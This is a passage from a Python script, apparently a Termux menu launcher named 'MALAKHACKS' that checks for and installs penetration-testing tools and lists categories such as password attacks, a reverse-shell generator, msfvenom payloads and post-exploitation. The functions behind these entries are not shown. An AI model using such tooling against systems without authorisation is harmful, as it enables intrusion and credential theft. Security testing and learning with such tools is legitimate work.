        ("metasploit",   "pkg install unstable-repo && pkg install metasploit"),
        ("ffuf",         "pkg install ffuf"),
        ("steghide",     "pkg install steghide"),
        ("whois",        "pkg install whois"),
        ("dig",          "pkg install dnsutils"),
        ("git",          "pkg install git"),
        ("curl",         "pkg install curl"),
        ("python3",      "pkg install python"),
        ("traceroute",   "pkg install traceroute"),
        ("strings",      "pkg install binutils"),
    ]
    ok_count = 0
    print(f"  {'Tool':<16} {'Status':<10} {'Install if missing'}")
    print(f"  {'─'*15} {'─'*9} {'─'*30}")
    for tool, install in tools:
        found = check_tool(tool)
        status = f"{C.GREEN}installed{C.END}" if found else f"{C.RED}missing  {C.END}"
        install_hint = "" if found else install
        print(f"  {tool:<16} {status}  {C.DIM}{install_hint}{C.END}")
        if found: ok_count += 1
    print(f"\n  {ok_count}/{len(tools)} tools available\n")

def install_menu():
    section("Install Common Tools")
    print(f"""
{C.CYAN}Core tools:{C.END}
  pkg install nmap hydra sqlmap john hashcat nikto gobuster aircrack-ng

{C.CYAN}Utilities:{C.END}
  pkg install git curl wget python dnsutils whois traceroute binutils steghide

{C.CYAN}Metasploit (large download):{C.END}
  pkg install unstable-repo
  pkg install metasploit

{C.CYAN}Python tools:{C.END}
  pip install wafw00f impacket scapy

{C.CYAN}Update everything:{C.END}
  pkg update && pkg upgrade
""")
    confirm = get_input("Run core + utilities install now? [y/N]: ", "n")
    if confirm.lower() == "y":
        os.system("pkg install -y nmap hydra sqlmap john hashcat nikto gobuster aircrack-ng git curl wget python dnsutils whois traceroute binutils")

# ==================== MENU ====================

CATEGORIES = {
    "1":  (" Network Scanning", [
        ("DNS Lookup",        dns_lookup),
        ("Subdomain Finder",  subdomain_find),
        ("Port Scan (nmap)",  port_scan),
        ("Ping Sweep",        ping_sweep),
        ("Service Detection", service_detect),
        ("OS Detection",      os_detect),
        ("Traceroute",        traceroute_run),
        ("WHOIS Lookup",      whois_lookup),
        ("DNS Records",       dns_records),
        ("My IP Info",        my_ip),
    ]),
    "2":  (" Web Hacking", [
        ("SQLMap",            sqlmap_run),
        ("Nikto Scanner",     nikto_run),
        ("Gobuster DirBrute", gobuster_run),
        ("FFUF Fuzzer",       ffuf_run),
        ("HTTP Header Grab",  curl_check),
        ("WAF Detection",     wafw00f_run),
        ("Tech Detection",    whatweb_run),
    ]),
    "3":  (" Password Attacks", [
        ("Hash Identifier",   hash_identifier),
        ("Hash Crack (built-in)", hash_crack_wordlist),
        ("Hashcat",           hashcat_run),
        ("John the Ripper",   john_run),
        ("Hydra Brute Force", hydra_run),
    ]),
    "4":  (" Exploitation", [
        ("Metasploit Ref",    metasploit_menu),
        ("SearchSploit",      searchsploit_run),
        ("Reverse Shell Gen", reverse_shell),
        ("MSFVenom Payloads", msfvenom_menu),
    ]),
    "5":  (" Wireless", [
        ("Aircrack-ng Guide", aircrack_menu),
        ("Bluetooth Scan",    bluetooth_scan),
    ]),
    "6":  (" Post Exploitation", [
        ("LinPEAS",           linpeas_run),
        ("Privesc Checklist", privesc_tips),
    ]),
    "7":  (" Forensics", [
        ("Steghide Hide",     stego_hide),
        ("Steghide Extract",  stego_extract),
        ("ExifTool",          exiftool_run),
        ("Binwalk",           binwalk_run),
        ("Strings",           strings_run),
        ("File Magic",        file_magic),
        ("Hex Dump",          xxd_hex),
    ]),
    "8":  (" Cryptography", [
        ("Base64 Encode",     base64_encode),
        ("Base64 Decode",     base64_decode),
        ("MD5 Hash",          md5_hash),
        ("SHA1 Hash",         sha1_hash),
        ("SHA256 Hash",       sha256_hash),
        ("ROT13",             rot13_encode),
        ("Caesar Cipher",     caesar_cipher),
        ("XOR Byte",          xor_cipher),
    ]),
    "9":  (" OSINT", [
        ("GeoIP Lookup",      geoip),
        ("Shodan (internetdb)",shodan_lookup),
        ("theHarvester",      theharvester_run),
        ("WHOIS",             whois_lookup),
        ("DNS Records",       dns_records),
        ("My IP Info",        my_ip),
    ]),
    "10": (" Tool Manager", [
        ("Check Tool Status", tool_checker),
        ("Install Tools",     install_menu),
    ]),
}

def show_menu():
    print(f"\n{C.BOLD}{C.BLUE}{'═'*52}{C.END}")
    print(f"{C.BOLD}{C.PINK}              ✦  MALAKHACKS  ✦{C.END}")
    print(f"{C.BOLD}{C.BLUE}{'═'*52}{C.END}\n")
    for key, (name, _) in CATEGORIES.items():
        print(f"  {C.GREEN}[{key:>2}]{C.END} {name}")
    print(f"  {C.RED}[ 0]{C.END} Exit")
    print(f"\n{C.BOLD}{C.BLUE}{'═'*52}{C.END}")

def show_submenu(name, tools):
    print(f"\n{C.BOLD}{C.PINK}  {name}{C.END}")
    print(f"  {C.DIM}{'─'*40}{C.END}")
    for i, (tool_name, _) in enumerate(tools, 1):
        print(f"  {C.GREEN}[{i:>2}]{C.END} {tool_name}")
    print(f"  {C.RED}[ 0]{C.END} Back")
    print()

def main():
    banner()
    while True:
        show_menu()
        cat_choice = input(f"\n{C.CYAN}malakhacks > {C.END}").strip()

        if cat_choice in ("0", "00", "exit", "quit", "q"):
            print(f"\n{C.PINK}  bye malak 🎀{C.END}\n")
            break

        if cat_choice not in CATEGORIES:
            err("Invalid option")
            continue

        name, tools = CATEGORIES[cat_choice]
        while True:
            show_submenu(name, tools)
            tool_choice = input(f"{C.CYAN}> {C.END}").strip()

            if tool_choice == "0":
                break

            try:
                idx = int(tool_choice) - 1
                if 0 <= idx < len(tools):
                    try:
                        tools[idx][1]()
                    except KeyboardInterrupt:
                        print(f"\n{C.YELLOW}  [interrupted]{C.END}")
                    except Exception as e:
                        err(f"Unexpected error: {e}")
                else:
                    err("Invalid number")
            except ValueError:
                err("Enter a number")

            input(f"\n{C.DIM}  press enter to continue...{C.END}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.YELLOW}  Exiting...{C.END}\n")
        sys.exit(0)
